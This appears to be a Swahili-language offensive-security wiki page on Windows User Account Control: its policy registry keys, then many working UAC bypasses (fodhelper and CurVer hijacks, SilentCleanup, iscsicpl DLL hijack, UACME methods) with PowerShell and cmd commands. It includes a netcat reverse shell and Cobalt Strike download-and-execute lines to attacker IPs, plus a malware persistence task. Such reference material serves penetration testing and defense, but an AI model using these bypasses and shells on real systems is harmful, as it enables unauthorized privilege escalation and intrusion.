# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **mwongozo wa idhini kwa shughuli zilizoinuliwa**. Applications zina viwango tofauti vya `integrity`, na program yenye **kiwango cha juu** inaweza kutekeleza majukumu ambayo **yanaweza kuhatarisha mfumo**. UAC inapowashwa, applications na tasks daima **huendeshwa chini ya muktadha wa usalama wa account isiyo ya administrator** isipokuwa administrator aidhinishe wazi applications/tasks hizo kupata access ya kiwango cha administrator kwenye mfumo ili ziendeshwe. Ni kipengele cha urahisi kinachowalinda administrators dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa security boundary.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapokuwa inatumika, user wa administrator hupewa tokens 2: token ya standard user, ya kutekeleza vitendo vya kawaida katika kiwango cha medium integrity, na nyingine yenye admin privileges.

Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inaeleza kwa kina jinsi UAC inavyofanya kazi na inajumuisha mchakato wa logon, user experience, na architecture ya UAC.<sup>[[2]](#references)</sup> Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kwa organization yao katika kiwango cha local (kwa kutumia secpol.msc), au kuisanidi na kuisambaza kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Settings mbalimbali zimejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna settings 10 za Group Policy zinazoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies za kusakinisha software kwenye Windows

**local security policies** ("secpol.msc" kwenye systems nyingi) husanidiwa kwa default ili **kuzuia users wasio admins kusakinisha software**. Hii inamaanisha kuwa hata kama user asiye admin anaweza kupakua installer ya software yako, hataweza kuiendesha bila account ya admin.

### Registry Keys za Kulazimisha UAC Kuomba Elevation

Kama standard user asiye na admin rights, unaweza kuhakikisha account ya "standard" **inaombwa credentials na UAC** inapojaribu kutekeleza actions fulani. Action hii ingehitaji kurekebisha **registry keys** fulani, ambazo zinahitaji admin permissions, isipokuwa kuwe na **UAC bypass**, au attacker tayari ameingia kama admin.

Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za account yake** ili kutekeleza administrative actions.

**Kwa vitendo, hii ni muhimu tu pale ambapo tayari una token iliyoinuliwa, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo, registry write yenyewe huzuiwa.**

Registry keys na entries unazopaswa kubadilisha ni zifuatazo (zikiwa na default values kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humwomba user kuingiza tena credentials zake.

### Kumbuka

**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka kwenye accounts zao na kupata administrator rights bila local privilege escalation exploit.

### Mwombe user 'full computer access'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama web browsers) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha browser kwa kutumia low-integrity token. Browser inapojaribu kufikia data iliyohifadhiwa katika low-integrity zone, operating system hukagua kiwango cha integrity cha process na kuruhusu ufikiaji ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata ufikiaji wa data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token iliyo na orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token hiyo pia ina orodha ya credentials za mtumiaji, ambazo hutumika kumthibitisha mtumiaji kwenye computer na kwenye resources za network.

### Autoadminlogon

Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji mahususi wakati wa startup, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye mifumo salama pekee, kwa kuwa hufichua password kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya kuingia, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi kwa sababu unaweza kubofya tu "Yes" UAC prompt inapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa administrators group**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kubypass UAC ikiwa iko katika kiwango cha juu zaidi cha usalama (Always) kuliko ikiwa iko katika viwango vingine vyovyote (Default).**

### Fast triage from a medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko katika scenario sahihi na linganisha host build na methods zinazojulikana kufanya kazi:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Maelezo ya vitendo:
- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza kiwango cha ulinzi, lakini bado unapaswa kujaribu build halisi badala ya kudhani kuwa itashindwa: UACME bado inafuatilia baadhi ya mbinu zinazoendana na `AlwaysNotify` kwenye Windows builds za kisasa.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza reverse shell yenye admin privileges** (high integrity level) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

Local RPC interface ya AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` inaweza kuunda process yenye debugging iliyowashwa. Process zilizoundwa kwa debugging kwenye thread moja hushiriki debug object ya thread hiyo; tukio la uundaji wa debugging hubeba process handle yenye ufikiaji kamili hata wakati matokeo ya RPC yenyewe yanatoa ufikiaji mdogo pekee. Hii hubadilisha utumiaji tena wa debug object kuwa primitive ya UAC kwa mwanachama wa Administrators mwenye medium-integrity.<sup>[[11]](#references)[[12]](#references)</sup>

Mlolongo wa vitendo unaweza kuwa:<sup>[[11]](#references)[[12]](#references)</sup>

1. Ita local RPC method (moja kwa moja au kupitia `NdrAsyncClientCall`) ili kuunda sacrificial process isiyo-elevated yenye debugging iliyowashwa.
2. Query `ProcessDebugObjectHandle` kwa kutumia `NtQueryInformationProcess`, itenganishe kwa `NtRemoveProcessDebug`, hifadhi object hiyo, kisha terminate sacrificial process.
3. Tumia RPC interface hiyo hiyo kuunda process inayoaminika na auto-elevated, kisha ihusishe object iliyohifadhiwa na calling thread kupitia `DbgUiSetThreadDebugObject`.
4. Ita `WaitForDebugEvent` na chukua process handle ya `CREATE_PROCESS_DEBUG_EVENT`; i-duplicate kwa `NtDuplicateObject` kabla ya kuendelea.
5. Wasilisha handle iliyoduplicatiwa kwa `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` na uzindue payload kwa extended startup-info structure. Hii hutumia tena elevated process context na pia huipa child uhusiano wa parent unaoonekana kuwa wa kuaminika.

Tafuta short sequence badala ya kuangalia auto-elevated binary pekee: uundaji wa process kupitia local AppInfo RPC, queries za `ProcessDebugObjectHandle`, debugger detach/reattach, creation-debug event ya mara moja, handle duplication, na child ambaye parent wake aliyorekodiwa haulingani na process iliyotekeleza creation APIs.<sup>[[12]](#references)</sup>

### **Very** Basic UAC "bypass" (ufikiaji kamili wa file system)

Ikiwa una shell yenye user aliye ndani ya Administrators group, unaweza **mount C$** shared kupitia SMB (file system) locally kwenye disk mpya na utakuwa na **ufikiaji wa kila kitu ndani ya file system** (hata Administrator home folder).

> [!WARNING]
> **Inaonekana mbinu hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass kwa Cobalt Strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.

### Miingiliano ya COM yenye elevated (`ICMLuaUtil` / `CMSTPLUA`)

COM objects zinazopata elevated kiotomatiki bado ni sehemu inayotumika ya UAC kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye matawi ya sasa ya Windows, na zana za offensive zinaendelea kurekebisha `CMSTPLUA` kwa kuunganisha mchakato wa interactive desktop, utekelezaji wa 64-bit, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya kiutendaji:
- Pendelea mchakato wa **64-bit** katika **interactive session** ya mtumiaji (kwa kawaida `explorer.exe` au child process wake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa BOF / UACME implementation badala ya `CreateProcess` wrapper rahisi.
- Tarajia child execution kufanyika katika **mchakato tofauti wenye elevated**; BOF nyingi hazi-elevate beacon ya sasa in-place.

### KRBUACBypass

Documentation na tool zinapatikana kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ni mkusanyiko wa mbinu za UAC bypass. Icompile kwa Visual Studio au MSBuild; build hutengeneza executables kadhaa (kwa mfano, `Source\Akagi\output\x64\Debug\Akagi.exe`), kwa hiyo chagua method inayofaa build ya target.<sup>[[3]](#references)</sup>\
Kuwa mwangalifu: baadhi ya bypass huzindua programu zinazoonekana au prompts zinazoweza kumtahadharisha mtumiaji.<sup>[[3]](#references)</sup>

UACME ina **build version ambayo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, ukitumia [ukurasa huu](https://en.wikipedia.org/wiki/Windows_10_version_history), unapata Windows release `1607` kutoka kwenye build versions.

Workflow ya vitendo ni **kupima build ya host kwanza**, kisha utekeleze method inayolingana:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` hulinganisha kwa haraka build ya ndani na mbinu zake za UAC zinazojulikana, jambo linalosaidia kuondoa haraka PoC ambazo hazifanyi kazi tena.<sup>[[4]](#references)</sup>
- `UACME` bado ni katalogi bora ya umma ya kuoanisha bypass na build mahususi. Toleo la 3.7.1 liliongeza mbinu 83–85, huku toleo lililotangulia likijaribu tena mbinu zilizokuwapo dhidi ya **Windows 11 25H2**; kagua tena jedwali la mbinu na maelezo ya matoleo badala ya kudhani kuwa PoC ya zamani bado inatumika bila mabadiliko.<sup>[[3]](#references)[[9]](#references)</sup>

### Chains za WNF/UIAccess zinazoweza kutumia Always Notify (UACME 3.7.1)

`Always Notify` haiondoi kila UAC bypass. UACME 3.7.1 hutekeleza mbinu tatu mpya za x64 zinazochanganya hali ya mazingira/protocol inayodhibitiwa na mtumiaji na tabia ya elevated scheduled-task au UIAccess, na inaziweka zote kama `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** elekeza upya `SystemRoot` ili WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` ifanye elevated `taskhostw.exe` ipakie `unifiedconsent.dll` kwa side-load. UACME inaifuatilia kuanzia Windows 10 build 19041.
- **84 — TabTip:** tumia primitive hiyo hiyo ya environment-variable dhidi ya UIAccess `TabTip.exe`, ambayo hupakia `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, au `rsaenh.dll` kulingana na build, kisha pivot kutoka kwenye UIAccess context yenye high-integrity inayotokana na hapo. UACME inaifuatilia kuanzia Windows 8.1 / Server 2016.
- **85 — Narrator:** hijack protocol ya kila mtumiaji ya `feedback-hub`, endesha Narrator kwa `Alt+CapsLock+F`, kisha zindua nakala ya `osk.exe` inayoweza kuandikwa ambayo hupakia `OskSupport.dll` kwa side-load. Hii inahitaji desktop shirikishi na inafuatiliwa kuanzia Windows 10 1809 / Server 2019.

Baada ya kujenga payload units na Akagi kama ilivyoandikwa na UACME, tekeleza nambari ya mbinu inayolingana (amri ya hiari hutumia `cmd.exe` kwa chaguo-msingi):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 na 85 zinategemea UIAccess/desktop interaction, kwa hivyo usitarajie zifanye kazi bila mabadiliko kutoka Session 0 au non-interactive service shell. Zote tatu hubadilisha hali ya environment/protocol na huweka DLLs; kagua implementation na uondoe artifacts hizo baada ya testing.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hujiinua kiotomatiki kwenye Windows za kisasa. Inapozinduliwa, huuliza registry path ya kila mtumiaji iliyo hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo humruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuanzisha mchakato wa High Integrity bila prompt ya UAC.

Registry path inayoombwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha ianzishe)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Maelezo:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (si Always Notify yenye vizuizi vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazoleta prompts kwa ajili ya stealth.

#### CurVer/extension hijack variant (HKCU only)

Samples za hivi karibuni zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya `ms-settings` ProgID** kupitia thamani ya `CurVer` ya kila mtumiaji. Binary iliyo-auto-elevated bado hutatua handler chini ya `HKCU`, hivyo hakuna admin token inayohitajika kupanda keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Baada ya kupata privileges za juu, malware kwa kawaida **huzima vidokezo vya baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na huunda upya persistence ili iendeshe ikiwa na high integrity. Task ya kawaida ya persistence huhifadhi **XOR-encrypted PowerShell script** kwenye diski na kui-decode/kui-execute kwenye memory kila saa:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Toleo hili bado husafisha **dropper** na kuacha tu staged payloads, hivyo detection hutegemea kufuatilia **`CurVer` hijack**, uchezaji wa `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusion, au scheduled tasks zinazo-decrypt PowerShell in-memory.<sup>[[5]](#references)</sup>

### UAC bypass kupitia `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` ikiwa na highest privileges na kupanua `%windir%` kutoka kwenye user environment. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye arbitrary command na kupata high integrity bila consent dialog.<sup>[[8]](#references)</sup> Njia hii bado inafaa kujaribiwa kwenye recent builds kwa sababu UACME inaendelea kuiweka technique hii active, na issue tracking ya hivi karibuni inaonyesha kuwa Windows 11 24H2 huenda ikahitaji tu marekebisho madogo ya quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If task ita nukuu path kwenye build hiyo, jaribu tena kwa payload inayoishia na quote (kwa mfano `cmd.exe"`). Safisha kila mara `HKCU\Environment\windir` baada ya kujaribu.

#### More UAC bypass

UAC bypass nyingi za zamani zinazotumia vibaya UI flows, COM objects, au desktop interaction zinahitaji **full interactive session** na victim; shell ya kawaida ya `nc.exe` au service inayoendesha kwenye **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hilo ukitumia session ya **meterpreter**. Migrate hadi kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye extension maalum (.thm) na uunganishe extension hiyo na payload yetu - More UAC bypass: Unaweza kupata hii ukitumia session ya meterpreter. Migrate hadi kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

Ikiwa una access ya **GUI unaweza kukubali tu UAC prompt** inapoonekana; kwa kweli huhitaji technical bypass. Kwa hiyo, kupata GUI session mara nyingi kunatosha kupita kikwazo cha kiutendaji kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **tools ambazo zitakuwa zinaendesha kama administrator** ambazo unaweza **kuendesha** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **stealthy** zaidi.

### Noisy brute-force UAC bypass

Ikiwa noise inakubalika, tool kama [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) inaweza kuomba elevation mara kwa mara hadi mtumiaji aikubali.

### Your own bypass - Basic UAC bypass methodology

Ukiangalia **UACME**, utaona kwamba **UAC bypass nyingi hutumia vibaya DLL hijacking** (mara nyingi kwa kufanya binary yenye elevated privileges ipakie DLL inayodhibitiwa na attacker kutoka kwenye writable path). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary itakayo **autoelevate** (thibitisha kwamba inapotekelezwa inaendesha kwenye high integrity level).
2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya **protected paths** (kama C:\Windows\System32), ambako huna permissions za kuandika. Unaweza kupita hili kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inakuruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii inatekelezwa kutoka kwenye high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na kutekeleza binary iliyo vulnerable na autoelevated.

### Another UAC bypass technique

Inahusisha kuchunguza ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayo **executed** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` ni binary **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kulingana na search order. Ikiwa unaweza kuweka `iscsiexe.dll` hasidi ndani ya folder **user-writable** na kisha kubadilisha `PATH` ya current user (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya elevated `iscsicpl.exe` process **without showing a UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Maelezo ya vitendo:
- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha kwenye **Medium Integrity** kwa sababu ya UAC.
- Copy ya **SysWOW64** ndiyo inayohusika na bypass hii. Chukulia copy ya **System32** kama binary tofauti na uthibitishe tabia yake kivyake.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hiyo workflow ileile ya ProcMon inayotumika kwa UAC bypass nyingine ni muhimu kuthibitisha DLL load inayokosekana.

Mtiririko wa chini kabisa:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Mawazo ya kugundua:
- Toa alert kwenye `reg add` / uandishi wa registry kwenda `HKCU\Environment\Path` unaofuatwa mara moja na utekelezaji wa `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo yanayodhibitiwa na **mtumiaji** kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Linganisha uzinduzi wa `iscsicpl.exe` na michakato tanzu isiyotarajiwa au upakiaji wa DLL kutoka nje ya saraka za kawaida za Windows.

### Utafiti mpya unaostahili kuchunguzwa kando

Baadhi ya chain za baada ya 2024 hazionekani tena kama utekaji nyara wa kawaida wa registry wa `HKCU\Software\Classes`. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kuhamisha kutoka medium hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe` na targets za baadaye kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia mifano mifupi ya payload katika:

{{#ref}}
